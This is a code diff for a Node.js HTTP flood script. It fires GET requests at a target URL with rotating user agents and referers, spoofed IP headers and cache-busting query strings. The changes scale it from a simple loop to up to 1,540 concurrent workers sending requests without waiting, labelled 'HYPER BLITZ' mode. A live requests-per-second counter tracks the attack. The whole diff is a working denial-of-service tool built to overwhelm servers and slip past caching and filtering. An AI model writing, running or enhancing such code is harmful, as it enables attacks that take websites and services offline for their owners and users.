@@ -1,11 +1,14 @@
 const axios = require('axios');
 const fs = require('fs');
+const os = require('os');
 const http = require('http');
 const https = require('https');
 const process = require('process');
 
+const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540);
+const MAX_REQUESTS_PER_WORKER = 5000;
+const STREAMS = 4;
 const REQUEST_TIMEOUT = 8000;
-const STREAMS = 3; // you can increase this if needed
 
 const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
     .split('\n')
@@ -30,7 +33,7 @@ const getRandomReferer = () => {
     return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
 };
 
-const makeRequest = async (target, stats) => {
+const makeRequest = (target, stats) => {
     const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
     const headers = {
         'User-Agent': getRandomUA(),
@@ -47,19 +50,26 @@ const makeRequest = async (target, stats) => {
 
     const urlWithNoise = target + (target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
 
-    try {
-        const response = await axios.get(urlWithNoise, {
-            headers,
-            timeout: REQUEST_TIMEOUT,
-            httpAgent: keepAliveHttp,
-            httpsAgent: keepAliveHttps,
-            validateStatus: null
-        });
-        stats.total++;
-        if (response.status === 200) stats.success++;
-    } catch {
-        stats.total++;
+    axios.get(urlWithNoise, {
+        headers,
+        timeout: REQUEST_TIMEOUT,
+        httpAgent: keepAliveHttp,
+        httpsAgent: keepAliveHttps,
+        validateStatus: null
+    }).then(res => {
+        stats.success++;
+    }).catch(() => {
         stats.errors++;
+    }).finally(() => {
+        stats.total++;
+    });
+};
+
+const startWorker = async (target, stats) => {
+    for (let sent = 0; sent < MAX_REQUESTS_PER_WORKER; sent += STREAMS) {
+        for (let i = 0; i < STREAMS; i++) {
+            makeRequest(target, stats);
+        }
     }
 };
 
@@ -101,33 +111,25 @@ const makeRequest = async (target, stats) => {
     console.log('  ============================================');
     console.log(`  TARGET: ${target}`);
     console.log(`  TIME:   ${duration}s`);
-    console.log(`  MODE:   FULL THROTTLE`);
+    console.log(`  MODE:   HYPER BLITZ - ${MAX_CONCURRENT} Workers × ${STREAMS} Streams`);
     console.log('  ============================================\n');
 
     let lastTotal = 0;
     const statInterval = setInterval(() => {
-        const elapsed = (Date.now() - startTime) / 1000;
         const currentRps = (stats.total - lastTotal) / 0.2;
         lastTotal = stats.total;
         stats.peakRps = Math.max(stats.peakRps, currentRps);
-
         process.stdout.write(
             `\r  SENT: ${stats.total} | 200 OK: ${stats.success} | ERR: ${stats.errors} | RPS: ${currentRps.toFixed(1)} `
         );
     }, 200);
 
-    const flood = async () => {
-        while (Date.now() < endTime) {
-            const requests = [];
-            for (let i = 0; i < STREAMS; i++) {
-                requests.push(makeRequest(target, stats));
-            }
-            await Promise.all(requests);
-        }
-    };
+    const workers = [];
+    for (let i = 0; i < MAX_CONCURRENT; i++) {
+        workers.push(startWorker(target, stats));
+    }
 
-    await flood();
-
+    await Promise.all(workers);
     clearInterval(statInterval);
 
     const elapsed = (Date.now() - startTime) / 1000;
